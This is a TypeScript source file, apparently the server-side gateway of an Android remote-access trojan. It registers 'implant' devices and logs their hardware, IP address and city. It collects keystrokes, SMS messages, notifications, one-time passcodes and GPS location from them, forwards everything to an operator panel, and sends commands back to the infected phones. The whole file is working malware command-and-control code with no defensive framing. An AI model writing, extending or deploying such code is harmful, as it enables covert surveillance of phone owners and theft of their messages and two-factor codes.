import crypto from 'node:crypto';
import type { Server as HttpServer } from 'node:http';
import { Server, type Socket } from 'socket.io';
import {
  PROTOCOL_VERSION,
  type Command,
  type DeviceStatus,
  type Envelope,
  type ImplantEvent,
} from '@xrc/shared';
import { log } from '../utils/logger.js';
import { isEnvelope } from './validate.js';
import {
  bumpCounter,
  setDeviceStatus,
  upsertDevice,
  type DeviceUpsert,
} from './deviceStore.js';
import { insertEvent } from './eventStore.js';

const EVENT_KINDS = new Set(['info', 'keylog', 'sms', 'notif', 'otp', 'location', 'capture', 'scan', 'status']);

function eventText(evt: ImplantEvent): string {
  switch (evt.kind) {
    case 'keylog': return `⌨ ${evt.app} → "${evt.text}"`;
    case 'otp': return `🔐 OTP ${evt.code} from ${evt.source}`;
    case 'sms': return `✉ [${evt.from}] ${evt.text}`;
    case 'notif': return `🔔 ${evt.app}: ${evt.text}`;
    case 'location': return `📍 ${evt.lat.toFixed(5)}, ${evt.lng.toFixed(5)} ±${evt.acc}m`;
    case 'capture': return `📦 capture ${evt.type}: ${evt.ref}`;
    case 'scan': return `🔍 scan ${evt.type}: ${JSON.stringify(evt.payload)}`;
    case 'status': return `status → ${evt.status}${evt.attempts ? ` (attempt ${evt.attempts})` : ''}`;
    case 'info': return `ℹ device info updated`;
  }
}

class SocketService {
  private io: Server | null = null;
  private implants = new Map<string, string>(); // deviceId -> socketId

  initialize(httpServer: HttpServer): void {
    this.io = new Server(httpServer, {
      cors: { origin: '*' },
      maxHttpBufferSize: 8_000_000,
    });
    this.io.on('connection', (socket) => this.onConnection(socket));
    log.info('socket gateway ready');
  }

  shutdown(): void {
    this.io?.close();
    this.io = null;
    this.implants.clear();
  }

  /* ---------- connections ---------- */

  private onConnection(socket: Socket): void {
    socket.on('panel:hello', () => this.onPanelHello(socket));
    socket.on('implant:hello', (payload: unknown) => this.onImplantHello(socket, payload));
    socket.on('implant:event', (envelope: unknown) => this.onImplantEvent(socket, envelope));
    socket.on('disconnect', () => this.onDisconnect(socket));
  }

  private onPanelHello(socket: Socket): void {
    socket.data.role = 'panel';
    socket.join('panel');
    log.info('panel client connected');
  }

  private onImplantHello(socket: Socket, payload: unknown): void {
    const p = (payload ?? {}) as Record<string, unknown>;
    const id = typeof p.id === 'string' ? p.id : '';
    if (!id) return;
    const input: DeviceUpsert = {
      id,
      status: 'online',
      lastSeen: Date.now(),
    };
    const str = (v: unknown): string | undefined => (typeof v === 'string' ? v : undefined);
    const num = (v: unknown): number | undefined => (typeof v === 'number' ? v : undefined);
    input.name = str(p.name);
    input.model = str(p.model);
    input.manufacturer = str(p.manufacturer);
    input.android = str(p.android);
    input.sdk = num(p.sdk);
    input.carrier = str(p.carrier);
    upsertDevice(input);

    socket.data.role = 'implant';
    socket.data.deviceId = id;
    socket.join(`device:${id}`);
    this.implants.set(id, socket.id);
    this.broadcastStatus(id, 'online');
  }

  private onImplantEvent(socket: Socket, envelope: unknown): void {
    if (!isEnvelope(envelope)) return;
    const e = envelope as Envelope;
    if (e.t !== 'evt') return;
    const evt = e.d as ImplantEvent;
    if (typeof evt !== 'object' || evt === null || typeof (evt as { deviceId?: unknown }).deviceId !== 'string') return;
    if (!EVENT_KINDS.has((evt as { kind?: unknown }).kind as string)) return;

    const deviceId = (evt as { deviceId: string }).deviceId;

    if (evt.kind === 'info') {
      const info = (evt as { info: DeviceInfoLike }).info;
      upsertDevice({
        id: deviceId,
        name: info.name, model: info.model, manufacturer: info.manufacturer,
        android: info.android, sdk: info.sdk, carrier: info.carrier,
        signal: info.signal, battery: info.battery, temp: info.temp,
        ramUsed: info.ramUsed, ramTotal: info.ramTotal,
        storageFree: info.storageFree, storageTotal: info.storageTotal,
        ipLocal: info.ipLocal, ipPublic: info.ipPublic, city: info.city,
        skin: info.skin, rooted: info.rooted,
        status: info.status ?? 'online',
        lastSeen: Date.now(),
      });
    } else if (evt.kind === 'keylog') {
      bumpCounter(deviceId, 'keys');
    } else if (evt.kind === 'otp') {
      bumpCounter(deviceId, 'otps');
    }

    insertEvent({
      ts: Date.now(),
      type: evt.kind,
      deviceId,
      text: eventText(evt),
      data: JSON.stringify(evt),
    });

    this.io?.to('panel').emit('event', evt);
  }

  private onDisconnect(socket: Socket): void {
    const deviceId = socket.data.deviceId as string | undefined;
    if (!deviceId) return;
    this.implants.delete(deviceId);
    setDeviceStatus(deviceId, 'offline');
    this.broadcastStatus(deviceId, 'offline');
    log.info('implant disconnected', deviceId);
  }

  /* ---------- commands ---------- */

  sendCommand(deviceId: string, command: Command): { delivered: boolean; error?: string } {
    const io = this.io;
    if (!io) return { delivered: false, error: 'gateway not initialized' };
    const socketId = this.implants.get(deviceId);
    if (!socketId) return { delivered: false, error: 'device offline' };
    const envelope: Envelope = { v: PROTOCOL_VERSION, id: crypto.randomUUID(), t: 'cmd', d: command };
    io.to(socketId).emit('cmd', envelope);
    insertEvent({
      ts: Date.now(),
      type: 'command',
      deviceId,
      text: `sent ${command.cmd}`,
      data: JSON.stringify(command),
    });
    return { delivered: true };
  }

  broadcastStatus(deviceId: string, status: DeviceStatus): void {
    this.io?.to('panel').emit('device:status', { deviceId, status, ts: Date.now() });
  }
}

interface DeviceInfoLike {
  name?: string; model?: string; manufacturer?: string; android?: string;
  sdk?: number; carrier?: string; signal?: number; battery?: number; temp?: number;
  ramUsed?: number; ramTotal?: number; storageFree?: number; storageTotal?: number;
  ipLocal?: string; ipPublic?: string; city?: string | null; skin?: string | null;
  rooted?: boolean; status?: DeviceStatus;
}

export const socketService = new SocketService();
